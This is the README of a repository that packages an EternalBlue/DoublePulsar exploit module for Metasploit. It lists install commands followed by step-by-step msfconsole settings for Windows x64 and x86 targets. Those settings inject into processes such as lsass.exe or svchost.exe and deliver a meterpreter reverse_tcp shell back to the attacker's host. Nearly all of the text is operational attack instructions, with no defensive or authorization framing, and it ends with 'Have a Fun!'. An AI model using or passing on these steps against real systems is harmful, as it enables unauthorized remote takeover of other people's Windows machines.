# Eternalblue-Doublepulsar-Metasploit

# How to Install

- dpkg --add-architecture i386 && apt-get update -y && apt-get install wine32 -y
- git clone https://github.com/grglzrv/Eternalblue-Doublepulsar-Metasploit.git
- cd Eternalblue-Doublepulsar-Metasploit
- cp eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb

* Note !!!: Also copy 'deps' directory to /usr/share/metasploit-framework/modules/exploits/windows/smb

- mkdir -p /root/.wine/drive_c/

# How to use

- service postgresql start
- service postgresql enable
- msfconsole
- reload_all 
- use exploit/windows/smb/eternalblue_doublepulsar
- show options

 * For Windows x64 

-  RHOST (Target IP)
 - set PROCESSINJECT svchost.exe or set PROCESSINJECT lsass.exe
 - set TARGETARCHITECTURE x64
 - set payload windows/x64/meterpreter/reverse_tcp
 - set LHOST (Local IP, check it with 'ip a')
 - show targets
 - set target 8
 - run or exploit
 
 * For Windows x86

 - set RHOST (Target IP)
 - set PROCESSINJECT svchost.exe or set PROCESSINJECT explorer.exe
 - set TARGETARCHITECTURE x86
 - set payload windows/meterpreter/reverse_tcp
 - set LHOST (Local IP, check it with 'ip a')
 - show targets
 - set target 8
 - run or exploit
 
 # Have a Fun! :)
